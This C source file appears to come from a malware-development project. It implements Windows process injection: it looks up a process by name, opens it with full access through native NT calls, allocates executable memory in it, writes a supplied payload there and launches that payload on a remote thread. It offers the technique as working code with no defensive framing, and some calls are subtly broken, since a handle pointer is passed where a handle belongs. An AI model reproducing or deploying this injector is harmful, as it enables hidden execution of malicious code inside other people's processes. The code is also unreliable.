#include"Defs.h"

int getProcID(const char* procName){
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL,0);
    if (snapshot ==  INVALID_HANDLE_VALUE){
        printf("Error while geting the PID , %d\n",GetLastError());
        return -1;
    }

    PROCESSENTRY32 current;
    current.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(snapshot,&current)){
        printf("Couldnt enter the snapshot");
        return -1;
    }

    while(Process32Next(snapshot,&current)){
        if (strcmpi(current.szExeFile,procName) == 0){
            printf("Process '%s' ID is %d\n",procName, current.th32ProcessID);
            return current.th32ProcessID;
        }
    }

    printf("Process Not found");
    return -1; 
}

int getProcessHandle(HANDLE* ProcHandle,HMODULE Hmod,int PID){
   /*Function Pointer*/ 
    NTOpenProcess Open=(NTOpenProcess)GetProcAddress(Hmod,"NtOpenProcess");
    
    /*Declare objects to call the open function*/
    OBJECT_ATTRIBUTES OBJ = {(sizeof(OBJ)),NULL};
    CLIENT_ID CID = {(PVOID*)PID,NULL};

    /*Call the open fuction*/
    NTSTATUS result = Open(ProcHandle,PROCESS_ALL_ACCESS,&OBJ,&CID);
    if (result == (NTSTATUS)0x00000000L){
        printf("Successfully got handle %p\n",ProcHandle);
        return 1;
    }
    printf("Something went wrong\n");
    return 0;
}

LPVOID allocateMemory(HANDLE ProcHandle,HMODULE Hmod, size_t payload_size){
NtVirtualAlloc Alloc=(NtVirtualAlloc)GetProcAddress(Hmod,"NtAllocateVirtualMemory");

/*Parameter : */
LPVOID Base = NULL; // where the address will be returned
NTSTATUS result = Alloc(ProcHandle,&Base,NULL,&payload_size,(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

if (result==(NTSTATUS)0X00000000L){
    printf("The memory is allocated at %p\n",Base);
    return Base;
}
printf("Error %d",result);
return 0;
}

int writeIntoMemory(HANDLE* ProcHandle,HMODULE Hmod,LPVOID base, unsigned char payload[],size_t payload_size){
    NtWriteVitualMemory write = (NtWriteVitualMemory)GetProcAddress(Hmod,"NtWriteVirtualMemory");

    size_t written =0;
    NTSTATUS result = write(ProcHandle,base,payload,payload_size,&written);

    if (result ==(NTSTATUS)0x00000000L){
        printf("%d Bytes were written at %p\n",written,base);
        return 1;
    }

    printf("Failed to write, Error code %d",GetLastError());
    return 0;
}

HANDLE createThread(HANDLE* ProcHandle,HMODULE Hmod, PVOID base){
    NtCreateThreadEx create = (NtCreateThreadEx)GetProcAddress(Hmod,"NtCreateThreadEx");
    HANDLE threadHandle = NULL;
    OBJECT_ATTRIBUTES OBJ= {sizeof(OBJ),NULL};
    NTSTATUS result = create(&threadHandle,THREAD_ALL_ACCESS,&OBJ,ProcHandle,base,NULL,0,0,0,0,NULL);

    if (result == (NTSTATUS)0x00000000L){
        printf("thread was created with the handle %p\n",threadHandle );
        return threadHandle;
    }
    printf("Thread Error 0x%x\n",result);
    return NULL;
}


